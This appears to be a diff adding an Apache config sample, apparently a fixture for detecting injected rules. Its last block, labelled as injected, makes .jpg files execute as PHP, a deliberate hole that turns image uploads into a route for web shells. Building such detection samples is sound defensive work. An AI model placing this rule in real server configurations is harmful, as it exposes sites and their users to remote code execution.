@@ -1,0 +1,11 @@
+# benign apache config
+AddType application/x-httpd-php .php
+Options -Indexes
+<FilesMatch "\.(log|bak)$">
+    Require all denied
+</FilesMatch>
+
+# --- INJECTED (apsb25-94 shape) ---
+<FilesMatch "\.jpg$">
+    SetHandler application/x-httpd-php
+</FilesMatch>
